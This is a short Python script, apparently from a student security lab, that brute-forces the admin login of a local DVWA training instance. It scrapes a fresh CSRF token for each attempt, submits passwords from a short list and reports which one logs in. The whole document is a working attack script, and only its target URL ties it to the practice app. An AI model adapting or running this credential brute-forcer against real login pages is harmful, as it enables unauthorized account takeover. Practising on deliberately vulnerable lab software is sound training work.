import requests
import re

session = requests.Session()

login_page_url = "http://localhost/Lab05/DVWA-2.5/login.php"
target_url = login_page_url

username = "admin"
password_list = ["123456", "admin", "password", "pass", "root"]

def get_csrf_token(session, url):
    try:
        response = session.get(url)
        response.raise_for_status()
        # Sử dụng regex để tìm token, tìm value trong input có name='user_token'
        match = re.search(r"name='user_token' value='([a-f0-9]{32})'", response.text)
        if match:
            return match.group(1)
        else:
            print("[-] Could not find CSRF token (user_token). Check DVWA security level or HTML source.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Error fetching login page: {e}")
        return None
    except Exception as e:
        print(f"[-] An unexpected error occurred while getting token: {e}")
        return None


print("[*] Starting brute force attack...")

for password in password_list:
    print(f"[*] Trying password: {password}")

    user_token = get_csrf_token(session, login_page_url)

    if not user_token:
        print("[-] Failed to get CSRF token, stopping.")
        break

    post_data = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": user_token
    }

    try:
        response = session.post(target_url, data=post_data)
        response.raise_for_status() # Kiểm tra lỗi HTTP
        if "Login failed" in response.text or "login.php" in response.url:
            print(f"[-] Password: {password} - Failed")
        elif "index.php" in response.url or "Welcome to Damn Vulnerable Web Application" in response.text:
            print(f"[+] ============================")
            print(f"[+] Password found: {password}")
            print(f"[+] ============================")
            break
        else:
             print(f"[?] Password: {password} - Unknown status. Response URL: {response.url}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during POST request for password '{password}': {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred for password '{password}': {e}")


print("[*] Brute force attempt finished.")

# python bruteforce_dvwa.py